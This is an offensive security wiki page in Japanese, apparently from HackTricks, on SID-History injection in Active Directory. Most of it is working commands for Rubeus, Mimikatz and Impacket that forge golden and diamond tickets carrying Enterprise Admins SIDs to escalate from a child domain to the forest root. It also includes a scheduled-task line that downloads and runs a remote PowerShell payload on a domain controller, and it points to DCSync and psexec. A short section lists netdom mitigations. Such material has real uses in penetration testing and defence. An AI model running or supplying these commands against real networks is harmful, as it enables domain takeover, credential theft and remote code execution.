# SID-History Injection

{{#include ../../banners/hacktricks-training.md}}

## SID History Injection Attack

**SID History Injection Attack** の目的は、**user migration between domains** を支援し、以前の domain の resource への継続的な access を確保することです。これは、user の以前の Security Identifier (SID) を新しい account の SID History に**組み込む**ことで実現されます。特に、この process は、parent domain の高権限 group（Enterprise Admins や Domain Admins など）の SID を SID History に追加することで、不正な access を許可するように悪用できます。この exploit により、parent domain 内のすべての resource への access が与えられます。<sup>[[1]](#references)[[2]](#references)</sup>

この attack を実行する方法は、**Golden Ticket** または **Diamond Ticket** の作成による 2 つです。

**"Enterprise Admins"** group の SID を特定するには、まず root domain の SID を特定する必要があります。特定後、root domain の SID に `-519` を追加することで、Enterprise Admins group の SID を構成できます。たとえば、root domain の SID が `S-1-5-21-280534878-1496970234-700767426` の場合、"Enterprise Admins" group の SID は `S-1-5-21-280534878-1496970234-700767426-519` になります。<sup>[[1]](#references)</sup>

**Domain Admins** groups を使用することもできます。この SID は **512** で終わります。

別の domain にある group（たとえば "Domain Admins"）の SID を見つける別の方法は、次のとおりです。
```bash
Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
```
> [!WARNING]
> trust relationship では SID history を無効化でき、その場合この攻撃は失敗します。

[**docs**](https://technet.microsoft.com/library/cc835085.aspx) によると:<sup>[[3]](#references)</sup>
- netdom tool を使用して **forest trusts の SIDHistory を無効化**する（ドメインコントローラー上で `netdom trust /domain: /EnableSIDHistory:no` を実行）
- netdom tool を使用して **external trusts に SID Filter Quarantining を適用**する（ドメインコントローラー上で `netdom trust /domain: /quarantine:yes` を実行）
- **単一の forest 内の domain trusts に SID Filtering を適用**することは、サポート対象外の構成であり、重大な変更を引き起こす可能性があるため推奨されません。forest 内の domain が信頼できない場合、その domain は forest のメンバーであるべきではありません。この場合、まず信頼された domain と信頼されていない domain を別々の forest に分割し、interforest trust に SID Filtering を適用する必要があります。

これを bypass する方法については、こちらの post を確認してください: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)<sup>[[4]](#references)</sup>

### Diamond Ticket (Rubeus + KRBTGT-AES256)

前回これを試したときは、arg **`/ldap`** を追加する必要がありました。
```bash
# Use the /sids param
Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap

# Or a ptt with a golden ticket
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

#e.g.

execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domain:current.domain.local /sid:S-1-21-19375142345-528315377-138571287 /rc4:12861032628c1c32c012836520fc7123 /sids:S-1-5-21-2318540928-39816350-2043127614-519 /ptt /ldap /nowrap /printcmd

# You can use "Administrator" as username or any other string
```
### KRBTGT-AES256を使用したGolden Ticket（Mimikatz）
```bash
mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"

/user is the username to impersonate (could be anything)
/domain is the current domain.
/sid is the current domain SID.
/sids is the SID of the target group to add ourselves to.
/aes256 is the AES256 key of the current domain's krbtgt account.
--> You could also use /krbtgt:<HTML of krbtgt> instead of the "/aes256" option
/startoffset sets the start time of the ticket to 10 mins before the current time.
/endin sets the expiry date for the ticket to 60 mins.
/renewmax sets how long the ticket can be valid for if renewed.

# The previous command will generate a file called ticket.kirbi
# Just loading you can perform a dcsync attack agains the domain
```
golden tickets の詳細については、以下を確認してください。


{{#ref}}
golden-ticket.md
{{#endref}}


diamond tickets の詳細については、以下を確認してください。


{{#ref}}
diamond-ticket.md
{{#endref}}
```bash
.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
.\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
ls \\mcorp-dc.moneycorp.local\c$
```
侵害されたドメインの KRBTGT hash を使用して、root の DA または Enterprise admin へ privilege escalation：
```bash
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'

gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local

schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "STCheck114" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
```
攻撃で取得した権限を使用すると、新しいドメインで、例えば DCSync attack を実行できます:


{{#ref}}
dcsync.md
{{#endref}}

### Linuxから

#### [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)を使用した手動実行
```bash
# This is for an attack from child to root domain
# Get child domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep "Domain SID"
# Get root domain SID
lookupsid.py <child_domain>/username@10.10.10.10 | grep -B20 "Enterprise Admins" | grep "Domain SID"

# Generate golden ticket
ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_domain_sid> -extra-sid <root_domain_sid> Administrator

# NOTE THAT THE USERNAME ADMINISTRATOR COULD BE ACTUALLY ANYTHING
# JUST USE THE SAME USERNAME IN THE NEXT STEPS

# Load ticket
export KRB5CCNAME=hacker.ccache

# psexec in domain controller of root
psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
```
#### [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)を使用した自動化

これは、**child domainからparent domainへの権限昇格を自動化する**Impacketのscriptです。scriptには以下が必要です。

- Target domain controller
- child domainのadmin userのCreds

フローは以下のとおりです。

- parent domainのEnterprise Admins groupのSIDを取得
- child domainのKRBTGT accountのhashを取得
- Golden Ticketを作成
- parent domainにログイン
- parent domainのAdministrator accountのcredentialsを取得
- `target-exec` switchが指定されている場合、Psexec経由でparent domainのDomain Controllerに対して認証する。
```bash
raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
```
## 参考文献

- [1] [Sneaky Active Directory Persistence #14: SID History - adsecurity.org](https://adsecurity.org/?p=1772)
- [2] [Security Identifier (SID) とは？ - SentinelOne](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
- [3] [Trust に関するセキュリティ上の考慮事項 - Microsoft TechNet](https://technet.microsoft.com/library/cc835085.aspx)
- [4] [itm8.com - ドメイン間のセキュリティ境界としての SID Filter Part 4](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)

{{#include ../../banners/hacktricks-training.md}}
